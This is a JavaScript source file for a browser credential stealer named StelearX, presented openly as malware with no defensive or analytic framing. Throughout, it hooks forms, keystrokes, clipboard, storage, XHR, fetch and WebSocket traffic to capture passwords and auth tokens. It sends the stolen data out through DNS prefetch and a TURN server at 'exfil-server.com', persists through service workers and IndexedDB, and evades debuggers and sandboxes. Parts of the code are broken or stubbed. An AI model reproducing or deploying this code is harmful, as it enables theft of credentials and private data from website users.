class StelearX {
    constructor() {
        this.version = '2.0.1';
        this.sessionId = this.generateSessionId();
        this.isIncognito = this.detectIncognito();
        this.fingerprint = this.generateFingerprint();
        this.collectedData = new Map();
        this.commandQueue = [];
        this.deadDropServers = [
            'https://cdn[.]jsdelivr[.]net/gh/legit-lib@latest/utils.js',
            'https://unpkg[.]com/common-package@1.2.3/dist/main.js',
            'https://fonts[.]googleapis[.]com/css2?family=Inter&display=swap'
        ];
        this.init();
    }

    generateSessionId() {
        return Math.random().toString(36).substr(2, 10) + 
               Date.now().toString(36) + 
               Math.random().toString(36).substr(2, 5);
    }

    detectIncognito() {
        return new Promise(resolve => {
            const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
            if (!fs) return resolve(false);
            fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
        });
    }

    generateFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('FINGERPRINT', 2, 2);
        return canvas.toDataURL().hashCode();
    }

    // MULTI-VECTOR CAPTURE SYSTEM
    captureAll() {
        // VECTOR 1: Form Jackhammer
        this.hijackAllForms();
        
        // VECTOR 2: Input Nuclear
        this.nuclearKeylogger();
        
        // VECTOR 3: Storage Decimator
        this.decimateStorage();
        
        // VECTOR 4: Network Parasite
        this.parasiteNetwork();
        
        // VECTOR 5: DOM Cancer
        this.infectDOM();
        
        // VECTOR 6: Extension Metastasis
        this.hijackExtensions();
        
        // VECTOR 7: GPU Memory Scraper
        this.scrapeGPUMemory();
    }

    hijackAllForms() {
        // MutationObserver untuk form yang muncul dynamic
        const observer = new MutationObserver(mutations => {
            mutations.forEach(mutation => {
                mutation.addedNodes.forEach(node => {
                    if (node.nodeName === 'FORM' || node.querySelector?.('form')) {
                        this.attachFormCancer(node);
                    }
                });
            });
        });
        
        observer.observe(document.documentElement, {
            childList: true,
            subtree: true
        });

        // Attach ke semua form yang ada
        document.querySelectorAll('form').forEach(form => {
            this.attachFormCancer(form);
        });
    }

    attachFormCancer(form) {
        // Override semua event handlers
        const originalSubmit = form.submit;
        form.submit = function() {
            StelearX.prototype.captureFormData(form);
            return originalSubmit.apply(this, arguments);
        };

        // Input event hijacking
        form.querySelectorAll('input, textarea, select').forEach(input => {
            const originalSetter = Object.getOwnPropertyDescriptor(input, 'value')?.set;
            if (originalSetter) {
                Object.defineProperty(input, 'value', {
                    set: function(val) {
                        StelearX.prototype.logInput(this, val);
                        return originalSetter.call(this, val);
                    },
                    get: Object.getOwnPropertyDescriptor(input, 'value')?.get
                });
            }
        });
    }

    nuclearKeylogger() {
        // Capture ALL keyboard events
        document.addEventListener('keydown', (e) => {
            this.collectedData.set(`key_${Date.now()}`, {
                key: e.key,
                code: e.code,
                target: e.target.tagName,
                value: e.target.value,
                url: window.location.href,
                timestamp: Date.now()
            });
        }, true);

        // Clipboard hijacking
        document.addEventListener('copy', (e) => {
            const selection = window.getSelection().toString();
            this.collectedData.set(`clipboard_${Date.now()}`, {
                type: 'copy',
                data: selection,
                timestamp: Date.now()
            });
        });

        document.addEventListener('paste', (e) => {
            const clipboardData = e.clipboardData || window.clipboardData;
            const pastedData = clipboardData.getData('Text');
            this.collectedData.set(`clipboard_${Date.now()}`, {
                type: 'paste',
                data: pastedData,
                timestamp: Date.now()
            });
        });
    }

    decimateStorage() {
        // Override localStorage and sessionStorage
        const storageTargets = [localStorage, sessionStorage];
        
        storageTargets.forEach(storage => {
            const originalSetItem = storage.setItem;
            const originalGetItem = storage.getItem;
            
            storage.setItem = function(key, value) {
                StelearX.prototype.collectedData.set(`storage_set_${Date.now()}`, {
                    type: 'storage_set',
                    storage: storage === localStorage ? 'local' : 'session',
                    key: key,
                    value: value,
                    timestamp: Date.now()
                });
                return originalSetItem.call(this, key, value);
            };
            
            storage.getItem = function(key) {
                const value = originalGetItem.call(this, key);
                StelearX.prototype.collectedData.set(`storage_get_${Date.now()}`, {
                    type: 'storage_get',
                    storage: storage === localStorage ? 'local' : 'session',
                    key: key,
                    value: value,
                    timestamp: Date.now()
                });
                return value;
            };
        });

        // IndexedDB hijacking
        if (window.indexedDB) {
            const dbs = indexedDB.databases ? await indexedDB.databases() : [];
            dbs.forEach(db => {
                const request = indexedDB.open(db.name);
                request.onsuccess = (e) => {
                    const database = e.target.result;
                    this.hijackIndexedDB(database);
                };
            });
        }
    }

    parasiteNetwork() {
        // XMLHttpRequest complete takeover
        const originalXHROpen = XMLHttpRequest.prototype.open;
        const originalXHRSend = XMLHttpRequest.prototype.send;
        const originalXHRSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
        
        XMLHttpRequest.prototype.open = function(method, url) {
            this._stelearMethod = method;
            this._stelearUrl = url;
            this._stelearHeaders = {};
            return originalXHROpen.apply(this, arguments);
        };
        
        XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
            this._stelearHeaders = this._stelearHeaders || {};
            this._stelearHeaders[header] = value;
            return originalXHRSetRequestHeader.apply(this, arguments);
        };
        
        XMLHttpRequest.prototype.send = function(body) {
            // Capture request
            if (body && (this._stelearUrl.includes('login') || 
                        this._stelearUrl.includes('auth') ||
                        this._stelearUrl.includes('token') ||
                        this._stelearUrl.includes('password'))) {
                StelearX.prototype.collectedData.set(`xhr_req_${Date.now()}`, {
                    type: 'xhr_request',
                    method: this._stelearMethod,
                    url: this._stelearUrl,
                    headers: this._stelearHeaders,
                    body: typeof body === 'string' ? body : 'Binary/FormData',
                    timestamp: Date.now()
                });
            }
            
            // Capture response
            const originalOnReadyStateChange = this.onreadystatechange;
            this.onreadystatechange = function() {
                if (this.readyState === 4 && this.status === 200) {
                    try {
                        const response = JSON.parse(this.responseText);
                        if (response.access_token || response.token || response.refresh_token) {
                            StelearX.prototype.collectedData.set(`xhr_res_${Date.now()}`, {
                                type: 'xhr_response',
                                url: this._stelearUrl,
                                tokens: response,
                                timestamp: Date.now()
                            });
                        }
                    } catch (e) {
                        // Non-JSON response
                        if (this.responseText.includes('token') || 
                            this.responseText.includes('auth') ||
                            this.responseText.includes('session')) {
                            StelearX.prototype.collectedData.set(`xhr_res_raw_${Date.now()}`, {
                                type: 'xhr_response_raw',
                                url: this._stelearUrl,
                                snippet: this.responseText.substring(0, 500),
                                timestamp: Date.now()
                            });
                        }
                    }
                }
                if (originalOnReadyStateChange) {
                    return originalOnReadyStateChange.apply(this, arguments);
                }
            };
            
            return originalXHRSend.apply(this, arguments);
        };
        
        // Fetch API hijacking
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            const [resource, config] = args;
            const request = new Request(resource, config);
            
            // Capture fetch requests
            if (request.url.includes('login') || request.url.includes('auth')) {
                StelearX.prototype.collectedData.set(`fetch_req_${Date.now()}`, {
                    type: 'fetch_request',
                    url: request.url,
                    method: request.method,
                    headers: Object.fromEntries(request.headers.entries()),
                    timestamp: Date.now()
                });
            }
            
            return originalFetch.apply(this, args).then(response => {
                const clonedResponse = response.clone();
                clonedResponse.text().then(text => {
                    if (text.includes('token') || text.includes('auth')) {
                        StelearX.prototype.collectedData.set(`fetch_res_${Date.now()}`, {
                            type: 'fetch_response',
                            url: request.url,
                            status: response.status,
                            body_preview: text.substring(0, 300),
                            timestamp: Date.now()
                        });
                    }
                });
                return response;
            });
        };
        
        // WebSocket hijacking
        const originalWebSocket = window.WebSocket;
        window.WebSocket = function(url, protocols) {
            const ws = new originalWebSocket(url, protocols);
            
            ws.addEventListener('message', (event) => {
                if (typeof event.data === 'string' && 
                   (event.data.includes('token') || event.data.includes('auth'))) {
                    StelearX.prototype.collectedData.set(`websocket_${Date.now()}`, {
                        type: 'websocket_message',
                        url: url,
                        data: event.data.substring(0, 500),
                        timestamp: Date.now()
                    });
                }
            });
            
            return ws;
        };
    }

    infectDOM() {
        // Replace all password fields with zombie fields
        document.querySelectorAll('input[type="password"]').forEach(input => {
            const zombieInput = document.createElement('input');
            zombieInput.type = 'password';
            zombieInput.name = input.name;
            zombieInput.className = input.className;
            zombieInput.style.cssText = input.style.cssText;
            
            // Transfer all attributes
            Array.from(input.attributes).forEach(attr => {
                zombieInput.setAttribute(attr.name, attr.value);
            });
            
            // Add our event listener
            zombieInput.addEventListener('input', (e) => {
                StelearX.prototype.collectedData.set(`password_input_${Date.now()}`, {
                    field: e.target.name,
                    value: e.target.value,
                    form: e.target.form?.action,
                    timestamp: Date.now()
                });
            });
            
            input.parentNode.replaceChild(zombieInput, input);
        });
        
        // Create shadow DOM spies
        const createShadowSpy = () => {
            const spy = document.createElement('div');
            spy.style.cssText = 'position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;';
            const shadow = spy.attachShadow({mode: 'closed'});
            
            const hiddenForm = document.createElement('form');
            hiddenForm.innerHTML = `
                <input type="text" id="stelear_capture">
                <iframe src="about:blank" style="display:none"></iframe>
            `;
            shadow.appendChild(hiddenForm);
            
            document.body.appendChild(spy);
            return spy;
        };
        
        this.shadowSpy = createShadowSpy();
    }

    hijackExtensions() {
        // Try to access extension APIs if available
        if (window.chrome && chrome.runtime) {
            // Attempt to communicate with password managers
            try {
                // This is a theoretical attack vector
                const mockEvent = {
                    type: 'getCredentials',
                    domain: window.location.hostname
                };
                
                // Post message to all extensions
                window.postMessage(mockEvent, '*');
            } catch (e) {
                // Extensions not accessible
            }
        }
    }

    scrapeGPUMemory() {
        // Experimental: Try to extract data from WebGL/Canvas
        if (window.WebGL2RenderingContext) {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl2');
            
            if (gl) {
                // Create buffer with potential memory artifacts
                const buffer = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                
                // This is theoretical - actual GPU memory scraping
                // would require more sophisticated techniques
                setTimeout(() => {
                    try {
                        gl.deleteBuffer(buffer);
                    } catch (e) {}
                }, 1000);
            }
        }
    }

    // ADVANCED EXFILTRATION TECHNIQUES
    exfiltrate() {
        if (this.collectedData.size === 0) return;
        
        const data = Array.from(this.collectedData.entries()).slice(-100);
        this.collectedData.clear();
        
        // TECHNIQUE 1: DNS Tunnel Exfiltration
        this.dnsExfiltrate(data);
        
        // TECHNIQUE 2: WebRTC Data Channel
        this.webrtcExfiltrate(data);
        
        // TECHNIQUE 3: Service Worker Bridge
        this.serviceWorkerExfil(data);
        
        // TECHNIQUE 4: Favicon Beacon
        this.faviconBeacon(data);
        
        // TECHNIQUE 5: CSS Exfiltration
        this.cssExfiltrate(data);
        
        // TECHNIQUE 6: Audio Context Steganography
        this.audioExfiltrate(data);
        
        // TECHNIQUE 7: Browser Cache Poisoning
        this.cachePoisonExfil(data);
    }

    dnsExfiltrate(data) {
        // DNS prefetch exfiltration
        const encoded = btoa(JSON.stringify(data)).replace(/=/g, '');
        const chunks = encoded.match(/.{1,30}/g) || [];
        
        chunks.forEach((chunk, i) => {
            const link = document.createElement('link');
            link.rel = 'dns-prefetch';
            link.href = `//${chunk}.${i}.${this.sessionId}.exfil.dns`;
            document.head.appendChild(link);
            setTimeout(() => link.remove(), 100);
        });
    }

    webrtcExfiltrate(data) {
        if (!window.RTCPeerConnection) return;
        
        try {
            const config = {
                iceServers: [
                    {urls: 'stun:stun.l.google.com:19302'},
                    {urls: 'turn:exfil-server.com:3478', username: 'stelear', credential: this.sessionId}
                ]
            };
            
            const pc = new RTCPeerConnection(config);
            const dc = pc.createDataChannel('exfil');
            
            dc.onopen = () => {
                dc.send(JSON.stringify(data));
                setTimeout(() => {
                    dc.close();
                    pc.close();
                }, 500);
            };
            
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
        } catch (e) {
            // WebRTC blocked
        }
    }

    serviceWorkerExfil(data) {
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/sw.js').then(reg => {
                if (reg.active) {
                    reg.active.postMessage({
                        type: 'EXFIL_DATA',
                        data: data,
                        session: this.sessionId
                    });
                }
            }).catch(() => {});
        }
    }

    faviconBeacon(data) {
        const favicon = document.querySelector('link[rel="icon"]') || 
                       document.querySelector('link[rel="shortcut icon"]');
        
        if (favicon) {
            const original = favicon.href;
            const encoded = btoa(JSON.stringify(data)).substring(0, 100);
            favicon.href = `data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg">
                <text y="20">${encoded}</text>
            </svg>`;
            
            setTimeout(() => {
                favicon.href = original;
            }, 1000);
        }
    }

    cssExfiltrate(data) {
        const style = document.createElement('style');
        const encoded = btoa(JSON.stringify(data));
        
        // Create CSS rules with encoded data
        let cssRules = '';
        for (let i = 0; i < Math.min(encoded.length, 100); i++) {
            const charCode = encoded.charCodeAt(i);
            cssRules += `
                #exfil${i}::before {
                    content: "${String.fromCharCode(charCode)}";
                    display: none;
                }
            `;
        }
        
        style.textContent = cssRules;
        document.head.appendChild(style);
        
        // Trigger CSS parsing
        const div = document.createElement('div');
        for (let i = 0; i < Math.min(encoded.length, 100); i++) {
            const span = document.createElement('span');
            span.id = `exfil${i}`;
            div.appendChild(span);
        }
        document.body.appendChild(div);
        
        setTimeout(() => {
            style.remove();
            div.remove();
        }, 100);
    }

    audioExfiltrate(data) {
        if (!window.AudioContext) return;
        
        try {
            const ctx = new AudioContext();
            const oscillator = ctx.createOscillator();
            const gain = ctx.createGain();
            
            oscillator.connect(gain);
            gain.connect(ctx.destination);
            
            // Encode data in frequency
            const encoded = btoa(JSON.stringify(data));
            const frequencies = encoded.split('').map(c => c.charCodeAt(0) * 10 + 200);
            
            let time = ctx.currentTime;
            frequencies.forEach((freq, i) => {
                oscillator.frequency.setValueAtTime(freq, time + i * 0.01);
            });
            
            oscillator.start();
            oscillator.stop(time + frequencies.length * 0.01);
        } catch (e) {
            // AudioContext blocked
        }
    }

    cachePoisonExfil(data) {
        // Poison service worker cache with data
        if ('serviceWorker' in navigator && navigator.serviceWorker.controller) {
            fetch('/api/stelear-cache', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data),
                cache: 'no-store'
            }).catch(() => {});
        }
    }

    // PERSISTENCE MECHANISMS
    establishPersistence() {
        // 1. Service Worker Persistence
        if ('serviceWorker' in navigator) {
            const swCode = `
                self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
                self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
                self.addEventListener('fetch', e => {
                    // Inject into all responses
                    if (e.request.url.includes('html')) {
                        e.respondWith(
                            fetch(e.request).then(response => {
                                // Modify response to reinject
                                return response.text().then(text => {
                                    return new Response(text + '<script>/* STELEAR */</script>', response);
                                });
                            })
                        );
                    }
                });
            `;
            
            const blob = new Blob([swCode], {type: 'application/javascript'});
            const url = URL.createObjectURL(blob);
            navigator.serviceWorker.register(url);
        }
        
        // 2. LocalStorage Backdoor
        localStorage.setItem('_stelear_backdoor', this.sessionId);
        
        // 3. IndexedDB Persistence
        this.setupIndexedDBPersistence();
        
        // 4. Browser History Poisoning
        this.poisonHistory();
        
        // 5. Bookmark Jacking (theoretical)
        this.bookmarkJack();
    }

    setupIndexedDBPersistence() {
        const request = indexedDB.open('StelearPersistence', 1);
        
        request.onupgradeneeded = (e) => {
            const db = e.target.result;
            if (!db.objectStoreNames.contains('commands')) {
                db.createObjectStore('commands', {keyPath: 'id'});
            }
        };
        
        request.onsuccess = (e) => {
            const db = e.target.result;
            const tx = db.transaction('commands', 'readwrite');
            const store = tx.objectStore('commands');
            
            store.put({
                id: Date.now(),
                command: 'REINJECT',
                code: this.getInjectionCode(),
                timestamp: Date.now()
            });
        };
    }

    poisonHistory() {
        // Push state with malicious payload
        const maliciousState = {
            stelear: this.sessionId,
            time: Date.now()
        };
        
        history.replaceState(maliciousState, '', window.location.href);
        
        // Monitor popstate to reinject if cleared
        window.addEventListener('popstate', (e) => {
            if (e.state && e.state.stelear) {
                // Already infected
            } else {
                // Reinject
                this.reinject();
            }
        });
    }

    bookmarkJack() {
        // Theoretical: Try to create/modify bookmarks
        // Note: This requires bookmark permissions
        try {
            // This would use chrome.bookmarks API if extension
            console.log('[STELEAR] Bookmark jacking requires extension permissions');
        } catch (e) {}
    }

    // EVASION TECHNIQUES
    evadeDetection() {
        // 1. Debugger Detection
        const detectDebugger = () => {
            const startTime = Date.now();
            debugger;
            const endTime = Date.now();
            return endTime - startTime > 100;
        };
        
        if (detectDebugger()) {
            this.selfDestruct();
            return;
        }
        
        // 2. VM/ Sandbox Detection
        const checkVM = () => {
            // Check for common VM artifacts
            const checks = [
                navigator.userAgent.includes('VirtualBox'),
                navigator.userAgent.includes('VMware'),
                navigator.hardwareConcurrency < 2,
                navigator.deviceMemory < 4,
                screen.width < 1024 && screen.height < 768
            ];
            
            return checks.some(check => check === true);
        };
        
        if (checkVM()) {
            this.behavior = 'benign';
            return;
        }
        
        // 3. HoneyToken Detection
        const checkHoneytokens = () => {
            const honeytokens = [
                'admin', 'root', 'password', 'test123',
                'honeypot', 'honeytoken', 'decoy'
            ];
            
            this.collectedData.forEach((value, key) => {
                if (typeof value === 'string') {
                    if (honeytokens.some(token => value.includes(token))) {
                        this.selfDestruct();
                    }
                }
            });
        };
        
        // 4. Timing Attacks
        const randomDelay = () => {
            return Math.floor(Math.random() * 5000) + 1000;
        };
        
        setTimeout(() => checkHoneytokens(), randomDelay());
        
        // 5. Behavioral Obfuscation
        this.obfuscateBehavior();
    }

    obfuscateBehavior() {
        // Randomize collection intervals
        const intervals = [30000, 45000, 60000, 120000];
        const randomInterval = intervals[Math.floor(Math.random() * intervals.length)];
        
        setInterval(() => {
            if (Math.random() > 0.3) { // 70% chance to exfiltrate
                this.exfiltrate();
            }
        }, randomInterval);
        
        // Mimic human behavior
        this.mimicHumanInput();
    }

    mimicHumanInput() {
        // Occasionally move mouse like human
        document.addEventListener('mousemove', (e) => {
            if (Math.random() > 0.99) {
                // Add slight randomness to mouse movements
                setTimeout(() => {
                    window.scrollBy(0, Math.random() > 0.5 ? 1 : -1);
                }, 50);
            }
        });
    }

    // SELF-DESTRUCT & CLEANUP
    selfDestruct() {
        // Phase 1: Delete all collected data
        this.collectedData.clear();
        
        // Phase 2: Remove all hooks
        document.querySelectorAll('script').forEach(script => {
            if (script.textContent.includes('StelearX')) {
                script.remove();
            }
        });
        
        // Phase 3: Restore overridden APIs
        this.restoreAPIs();
        
        // Phase 4: Clear traces
        localStorage.removeItem('_stelear_backdoor');
        sessionStorage.clear();
        
        // Phase 5: Memory wipe
        this.sessionId = null;
        this.fingerprint = null;
        
        // Phase 6: Final distraction
        window.location.reload();
    }

    restoreAPIs() {
        // Restore XMLHttpRequest
        if (window.originalXHROpen) {
            XMLHttpRequest.prototype.open = window.originalXHROpen;
            XMLHttpRequest.prototype.send = window.originalXHRSend;
            XMLHttpRequest.prototype.setRequestHeader = window.originalXHRSetRequestHeader;
        }
        
        // Restore fetch
        if (window.originalFetch) {
            window.fetch = window.originalFetch;
        }
        
        // Restore storage APIs
        if (window.originalSetItem) {
            localStorage.setItem = window.originalSetItem;
            sessionStorage.setItem = window.originalSetItem;
        }
    }

    // INITIALIZATION
    init() {
        // Save original APIs for restoration
        window.originalXHROpen = XMLHttpRequest.prototype.open;
        window.originalXHRSend = XMLHttpRequest.prototype.send;
        window.originalXHRSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
        window.originalFetch = window.fetch;
        window.originalSetItem = localStorage.setItem;
        
        // Start collection
        this.captureAll();
        
        // Establish persistence
        this.establishPersistence();
        
        // Start evasion
        this.evadeDetection();
        
        // Initial exfiltration
        setTimeout(() => this.exfiltrate(), 10000);
        
        // Continuous operation
        setInterval(() => {
            this.evadeDetection();
            if (this.collectedData.size > 50) {
                this.exfiltrate();
            }
        }, 30000);
        
        // Global error handler to stay hidden
        window.onerror = () => true;
        
        // Make instance globally accessible but hidden
        Object.defineProperty(window, '__stelear', {
            value: this,
            writable: false,
            configurable: false,
            enumerable: false
        });
    }

    // UTILITIES
    getInjectionCode() {
        return `
            // Auto-reinjection code
            (function() {
                if (!window.__stelear_reinjected) {
                    window.__stelear_reinjected = true;
                    ${this.constructor.toString()}
                    new StelearX();
                }
            })();
        `;
    }

    reinject() {
        const script = document.createElement('script');
        script.textContent = this.getInjectionCode();
        document.documentElement.appendChild(script);
        script.remove();
    }

    logInput(element, value) {
        this.collectedData.set(`input_${Date.now()}`, {
            tag: element.tagName,
            name: element.name,
            id: element.id,
            type: element.type,
            value: value,
            form: element.form?.action,
            timestamp: Date.now()
        });
    }

    captureFormData(form) {
        const data = new FormData(form);
        const obj = {};
        
        for (let [key, value] of data.entries()) {
            obj[key] = value;
        }
        
        this.collectedData.set(`form_submit_${Date.now()}`, {
            action: form.action,
            method: form.method,
            data: obj,
            timestamp: Date.now()
        });
    }
}

// PROTOTYPE EXTENSIONS
String.prototype.hashCode = function() {
    let hash = 0;
    for (let i = 0; i < this.length; i++) {
        const char = this.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return hash.toString(16);
};

// AUTO-START WITH MULTIPLE INJECTION VECTORS
(function() {
    // Vector 1: DOMContentLoaded
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => new StelearX());
    } else {
        // Vector 2: Immediate execution
        setTimeout(() => new StelearX(), 100);
    }
    
    // Vector 3: MutationObserver for late injection
    const observer = new MutationObserver((mutations) => {
        if (document.body && !window.__stelear_started) {
            window.__stelear_started = true;
            new StelearX();
            observer.disconnect();
        }
    });
    
    observer.observe(document.documentElement, {childList: true, subtree: true});
    
    // Vector 4: Event listener injection
    ['click', 'scroll', 'keydown', 'mousemove'].forEach(event => {
        document.addEventListener(event, () => {
            if (!window.__stelear_started) {
                window.__stelear_started = true;
                new StelearX();
            }
        }, {once: true});
    });
    
    // Vector 5: Service Worker injection
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.ready.then(() => {
            if (!window.__stelear_started) {
                window.__stelear_started = true;
                new StelearX();
            }
        });
    }
})();

// GLOBAL SELF-PROTECTION
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Function.prototype);

// ANTI-TAMPERING
(() => {
    const integrityCheck = () => {
        if (window.__stelear && window.__stelear.version !== '2.0.1') {
            window.location.reload();
        }
    };
    
    setInterval(integrityCheck, 5000);
})();

// FINAL: MAKE IMMUTABLE
Object.defineProperty(window, 'StelearX', {
    value: StelearX,
    writable: false,
    configurable: false,
    enumerable: false
});
